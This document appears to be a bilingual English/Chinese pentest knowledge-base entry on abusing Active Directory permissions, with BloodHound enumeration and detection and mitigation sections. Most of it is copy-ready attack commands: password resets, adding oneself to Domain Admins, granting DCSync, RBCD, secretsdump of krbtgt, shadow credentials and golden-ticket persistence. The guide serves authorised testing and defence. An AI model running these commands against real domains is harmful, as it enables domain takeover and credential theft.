---
id: ad-acl-abuse
title_en: Active Directory ACL Abuse and DCSync
title_zh: Active Directory ACL 滥用与 DCSync
summary_en: Most domain escalation paths are not exploits. They are permissions somebody granted years ago and nobody removed — one write right over a group, one GenericAll over a service account. BloodHound draws the map; this is how you walk it.
summary_zh: 域内大多数提权路径都不是漏洞利用，而是几年前被授予、之后没人清理的权限：对某个组的一条写权限，对某个服务账户的一个 GenericAll。BloodHound 把图画出来，这里讲怎么照着走。
tags: [active-directory, acl, dacl, dcsync, privilege-escalation, bloodhound, windows]
tools: [BloodHound, PowerView, impacket, certipy, mimikatz]
attck: [T1098, T1222, T1003.006]
platform: [windows]
difficulty: advanced
updated: 2026-10-08
---

<!-- lang:en -->
### Why ACLs are the quietest path

Active Directory is an access-control system that happens to also store users. Every object carries a DACL, and any entry in it can be enough to take the domain — while looking, from the outside, like ordinary delegation. There is no vulnerability to patch, no CVE, no malformed packet. There is a permission that should not exist.

This is why the graph matters more than the exploit list. A single `GenericAll` two hops from Domain Admins is a complete attack path, and BloodHound finds it in seconds.

### Step 1 — Collect, then read

```bash
# from a Windows foothold, in memory where possible
.\SharpHound.exe -c All --zippassword pass
# or with the Python collector from Linux
bloodhound-python -u jdoe -p 'Summer2026!' -d corp.local -ns 10.10.10.10 -c All
```

Then in BloodHound, the questions worth asking are:

- Shortest path from my owned principals to Domain Admins.
- Which objects can my user write to (Outbound Object Control)?
- Who controls the Tier 0 assets (DCs, CA, backup servers)?

On the command line, PowerView answers the same in a hurry:

```powershell
# what does my user control?
Find-InterestingDomainAcl -ResolveGUIDs | ? { $_.IdentityReferenceName -match 'jdoe' }

# who can write to a specific target?
Get-DomainObjectAcl -Identity svc_sql -ResolveGUIDs |
  ? { $_.ActiveDirectoryRights -match 'Write|GenericAll|GenericWrite' }
```

### Step 2 — The permissions that matter

| Right | On a user | On a group | On a computer |
|---|---|---|---|
| `GenericAll` | Full control: reset password, write SPN, write key credentials | Add yourself as a member | RBCD, or read LAPS |
| `GenericWrite` | Write attributes: SPN (targeted Kerberoast), key credentials | Write `member` | Write `msDS-AllowedToActOnBehalfOfOtherIdentity` |
| `ForceChangePassword` | Reset the password with no knowledge of the old one | — | — |
| `AddMember` / `AddSelf` | — | Add yourself or a controlled principal | — |
| `WriteDACL` | Grant yourself any other right | same | same |
| `WriteOwner` | Take ownership, then rewrite the DACL | same | same |
| `AllExtendedRights` | Equivalent to `ForceChangePassword` + read LAPS | — | — |
| `ReadLAPSPassword` | Read the local admin password | — | — |
| `DS-Replication-Get-Changes(-All)` | DCSync | DCSync | DCSync |

The pattern to internalise: **write access is escalation**. Any right that lets you change an attribute or a membership can be turned into another right, and the chain usually ends at a domain controller.

### Step 3 — Walking the chain

**GenericAll / ForceChangePassword on a user** — the shortest version:

```bash
# reset the password, then act as them
net rpc password svc_sql 'NewPassw0rd!' -U corp.local/jdoe%'Summer2026!' -S dc01.corp.local

# or with PowerView / Set-DomainUserPassword from a Windows foothold
```

If you would rather not touch the password (resets are visible and break things), write an SPN instead and roast it, or use shadow credentials (below).

**GenericAll / AddMember on a group** — add yourself, wait for a new logon token:

```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members jdoe -Verbose
# a fresh logon is required: new tokens are issued when you authenticate again
```

**WriteDACL** — grant yourself DCSync rights on the domain object:

```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' -PrincipalIdentity jdoe `
  -Rights DCSync -Verbose
```

**WriteOwner** — ownership implies the ability to rewrite the DACL, so this is `WriteDACL` with one extra step:

```powershell
Set-DomainObjectOwner -Identity target -OwnerIdentity jdoe
Add-DomainObjectAcl -TargetIdentity target -PrincipalIdentity jdoe -Rights All
```

**GenericAll / GenericWrite on a computer** — set up RBCD: the target will then allow a principal you control to impersonate any user against it, including a domain admin:

```powershell
# 1. create or take over a computer account you control
# 2. write the attribute
Set-DomainObject -Identity victim-pc$ -Set @{
  'msDS-AllowedToActOnBehalfOfOtherIdentity' = $sd
}
# 3. request a service ticket as an admin
impacket-getST -spn cifs/victim-pc.corp.local -impersonate administrator \
  corp.local/controlled$:'Password' -dc-ip 10.10.10.10
```

### DCSync — where most paths end

DCSync does not touch the target machine. It speaks the replication protocol to a domain controller and asks for password data, exactly as another DC would:

```bash
# requires DS-Replication-Get-Changes and ...-All on the domain object
impacket-secretsdump -just-dc-user krbtgt corp.local/jdoe:'Summer2026!'@dc01.corp.local

# everything, including the krbtgt hash (golden ticket material)
impacket-secretsdump -just-dc corp.local/jdoe:'Summer2026!'@dc01.corp.local
```

With mimikatz on a Windows foothold: `lsadump::dcsync /domain:corp.local /user:krbtgt`.

The krbtgt hash is the domain: it lets you forge a golden ticket valid for ten years, and it can only be invalidated by resetting that password **twice**.

### Shadow credentials — the modern alternative

Instead of resetting a password, write a key credential onto the target object and authenticate with the corresponding private key. It is quieter than a password reset and survives until the attribute is cleaned:

```bash
certipy shadow auto -u jdoe@corp.local -p 'Summer2026!' -account svc_sql -dc-ip 10.10.10.10
```

This needs `GenericWrite` (or `GenericAll`) over the target account — the same right as targeted Kerberoasting, but without generating a Kerberos request that a SOC might be watching for.

### Persistence

- **AdminSDHolder + SDProp.** Whatever ACL sits on `CN=AdminSDHolder,CN=System,DC=...` is re-applied to every protected account every 60 minutes. Grant yourself rights there and the domain re-grants them for you, forever.
- **SID history.** Inject an extra SID into a controlled account so it carries Domain Admin privileges without being a member of the group.
- **Golden ticket.** Forged with the krbtgt hash; survives password changes of every account except krbtgt itself (twice).
- **DSRM.** The Directory Services Restore Mode password is a local administrator on every DC, and is rarely rotated.

Each of these deserves its own write-up in the report; they are all "the client must rebuild trust in the domain" findings rather than "patch this box".

### OPSEC and detection

- ACL changes produce **Event 5136** (directory service object modified) on the DC, with the changed attribute in the event. `msDS-AllowedToActOnBehalfOfOtherIdentity`, `msDS-KeyCredentialLink`, `servicePrincipalName` and `member` are the attributes worth alerting on.
- **Event 4662** covers access to AD objects; the DCSync replication GUIDs appearing from a non-DC host is the classic DCSync signal.
- **Event 4728/4732/4756** (member added to a security group) — especially Domain Admins.
- Password resets of service accounts generate **4724**, and usually break something, which is its own kind of alarm.
- `bloodhound-python`, `SharpHound`, `Rubeus`, `certipy` and `mimikatz` are all caught by name on modern EDR; the *permission* is the finding, not the tool — the same path can be walked with built-in Windows tools.

### Mitigation

- **Audit ACLs on a schedule**, not once. BloodHound itself is the right tool for defenders here: run it, and treat every path to Tier 0 as a ticket.
- **Remove `GenericAll`/`GenericWrite`/`WriteDACL` from non-admin principals.** Delegation that was "convenient" in 2015 is an attack path now.
- **Protect Tier 0 accounts with the Protected Users group**, and keep the Tier 0 asset list short and enforced.
- **Monitor the DCSync GUIDs** and alert on replication requests from anything that is not a domain controller.
- **Rotate the krbtgt password twice** after any suspected domain compromise; a single reset leaves valid golden tickets alive.
- **Use gMSA for service accounts** and LAPS for local administrators, so a single write right does not convert into a reusable credential.
- **Treat AdminSDHolder as Tier 0 configuration** and review it as strictly as you review Domain Admins itself.

<!-- lang:zh -->
### 为什么 ACL 是最安静的一条路

Active Directory 本质是一套访问控制系统，只是顺便存了用户。每个对象都带一个 DACL，其中任何一条 ACE 都可能足以拿下整个域 —— 而表面上它看起来只是普通的委派配置。没有漏洞要打补丁，没有 CVE，没有畸形报文，只是存在一条不该存在的权限。

这就是为什么图谱比漏洞列表更重要：距离 Domain Admins 两跳的一个 `GenericAll`，就是一条完整的攻击路径，BloodHound 几秒钟就能画出来。

### 第一步 —— 先采集，再读图

```bash
# 已经拿到 Windows 落脚点时，尽量在内存里跑
.\SharpHound.exe -c All --zippassword pass
# 或者从 Linux 用 Python 采集器
bloodhound-python -u jdoe -p 'Summer2026!' -d corp.local -ns 10.10.10.10 -c All
```

然后在 BloodHound 里，值得问的问题只有这几个：

- 从我已控的主体到 Domain Admins 的最短路径。
- 我的用户能写哪些对象（Outbound Object Control）。
- 谁控制着 Tier 0 资产（域控、CA、备份服务器）。

命令行里 PowerView 能快速回答同样的问题：

```powershell
# 我的用户控制着什么？
Find-InterestingDomainAcl -ResolveGUIDs | ? { $_.IdentityReferenceName -match 'jdoe' }

# 谁能写某个特定目标？
Get-DomainObjectAcl -Identity svc_sql -ResolveGUIDs |
  ? { $_.ActiveDirectoryRights -match 'Write|GenericAll|GenericWrite' }
```

### 第二步 —— 真正要紧的权限

| 权限 | 在用户对象上 | 在组对象上 | 在计算机对象上 |
|---|---|---|---|
| `GenericAll` | 完全控制：重设口令、写 SPN、写密钥凭据 | 把自己加进去 | RBCD，或读 LAPS |
| `GenericWrite` | 写属性：SPN（定向 Kerberoast）、密钥凭据 | 写 `member` | 写 `msDS-AllowedToActOnBehalfOfOtherIdentity` |
| `ForceChangePassword` | 不需要旧口令直接重设 | — | — |
| `AddMember` / `AddSelf` | — | 加自己或自己控制的主体 | — |
| `WriteDACL` | 给自己授任意其他权限 | 同上 | 同上 |
| `WriteOwner` | 先拿所有权，再改 DACL | 同上 | 同上 |
| `AllExtendedRights` | 等价于 `ForceChangePassword` + 读 LAPS | — | — |
| `ReadLAPSPassword` | 读本地管理员口令 | — | — |
| `DS-Replication-Get-Changes(-All)` | DCSync | DCSync | DCSync |

要记住的规律是：**写权限就是提权**。任何能让你改属性或改成员的权限，都能被换成另一个权限，而这条链的终点通常是域控。

### 第三步 —— 顺着链走

**对用户对象有 GenericAll / ForceChangePassword** —— 最短的一种：

```bash
# 重设口令，然后以他的身份行动
net rpc password svc_sql 'NewPassw0rd!' -U corp.local/jdoe%'Summer2026!' -S dc01.corp.local

# 或者从 Windows 落脚点用 PowerView / Set-DomainUserPassword
```

如果你不想动口令（重设会留痕，也容易搞坏业务），那就改写 SPN 去烤，或者用下面的 shadow credentials。

**对组有 GenericAll / AddMember** —— 把自己加进去，然后等一个新令牌：

```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members jdoe -Verbose
# 需要重新登录：令牌是在再次认证时才重新签发的
```

**WriteDACL** —— 在域对象上给自己授 DCSync 权限：

```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' -PrincipalIdentity jdoe `
  -Rights DCSync -Verbose
```

**WriteOwner** —— 所有权意味着能改 DACL，所以这就是多加一步的 `WriteDACL`：

```powershell
Set-DomainObjectOwner -Identity target -OwnerIdentity jdoe
Add-DomainObjectAcl -TargetIdentity target -PrincipalIdentity jdoe -Rights All
```

**对计算机对象有 GenericAll / GenericWrite** —— 布置 RBCD：目标此后会允许你控制的主体对它冒充任意用户，包括域管：

```powershell
# 1. 创建或接管一个你控制的计算机账户
# 2. 写入属性
Set-DomainObject -Identity victim-pc$ -Set @{
  'msDS-AllowedToActOnBehalfOfOtherIdentity' = $sd
}
# 3. 以管理员身份申请服务票据
impacket-getST -spn cifs/victim-pc.corp.local -impersonate administrator \
  corp.local/controlled$:'Password' -dc-ip 10.10.10.10
```

### DCSync —— 大多数路径的终点

DCSync 不碰目标机器。它用复制协议跟域控对话，像另一台域控那样索要口令数据：

```bash
# 需要在域对象上拥有 DS-Replication-Get-Changes 与 ...-All
impacket-secretsdump -just-dc-user krbtgt corp.local/jdoe:'Summer2026!'@dc01.corp.local

# 全量，包含 krbtgt 哈希（黄金票据的原料）
impacket-secretsdump -just-dc corp.local/jdoe:'Summer2026!'@dc01.corp.local
```

在 Windows 落脚点上用 mimikatz：`lsadump::dcsync /domain:corp.local /user:krbtgt`。

krbtgt 的哈希就等于整个域：它能让你伪造有效期十年的黄金票据，而要让这张票据失效，必须把那个口令**重设两次**。

### Shadow credentials —— 更现代的替代方案

不重设口令，而是往目标对象上写一份密钥凭据，然后用对应的私钥认证。它比口令重设安静，而且直到属性被清理之前一直有效：

```bash
certipy shadow auto -u jdoe@corp.local -p 'Summer2026!' -account svc_sql -dc-ip 10.10.10.10
```

这同样需要对目标账户有 `GenericWrite`（或 `GenericAll`）—— 和定向 Kerberoast 是同一条权限，但不会产生那种可能被 SOC 盯上的 Kerberos 请求。

### 持久化

- **AdminSDHolder + SDProp。** 放在 `CN=AdminSDHolder,CN=System,DC=...` 上的 ACL，会被每 60 分钟重新套用到所有受保护账户上。在那里给自己授权，域就会永远替你重新授权。
- **SID History。** 往一个受控账户里注入额外 SID，让它不必加入组就带着域管权限。
- **黄金票据。** 用 krbtgt 哈希伪造；除了 krbtgt 自身口令被重设两次，它能扛过其他所有账户的改密。
- **DSRM。** 目录服务还原模式口令在每台域控上都是本地管理员，而且极少轮换。

这些每一条在报告里都该单独写：它们不是「给这台机器打补丁」，而是「客户必须重建对整个域的信任」。

### OPSEC 与检测

- ACL 变更会在域控上产生 **5136** 事件（目录服务对象被修改），事件里带着被改的属性。值得告警的属性是 `msDS-AllowedToActOnBehalfOfOtherIdentity`、`msDS-KeyCredentialLink`、`servicePrincipalName` 和 `member`。
- **4662** 事件覆盖对 AD 对象的访问；从非域控主机出现 DCSync 的复制 GUID，就是最经典的 DCSync 信号。
- **4728/4732/4756**（安全组成员被添加）—— 尤其是 Domain Admins。
- 服务账户口令被重设会产生 **4724**，而且通常会弄坏点什么，那本身就是一种警报。
- `bloodhound-python`、`SharpHound`、`Rubeus`、`certipy`、`mimikatz` 都会被现代 EDR 按名字抓；但**发现本身是那条权限**，不是工具 —— 同一条路用系统自带工具一样能走完。

### 缓解

- **定期审计 ACL**，而不是只审一次。对防守方来说 BloodHound 就是正确的工具：跑一遍，把每一条通往 Tier 0 的路径都当成工单处理。
- **把非管理员主体上的 `GenericAll`/`GenericWrite`/`WriteDACL` 清掉。** 2015 年图方便的委派，现在就是一条攻击路径。
- **用 Protected Users 保护 Tier 0 账户**，并把 Tier 0 资产清单压到最短、且强制维护。
- **监控 DCSync 的复制 GUID**，对任何不是域控的复制请求告警。
- **怀疑域被拿下后，把 krbtgt 口令重设两次**；只重设一次，已签发的黄金票据仍然有效。
- **服务账户用 gMSA、本地管理员用 LAPS**，这样单独一条写权限就不会变成可复用的凭据。
- **把 AdminSDHolder 当作 Tier 0 配置**，用审视 Domain Admins 的同等严格度去审它。
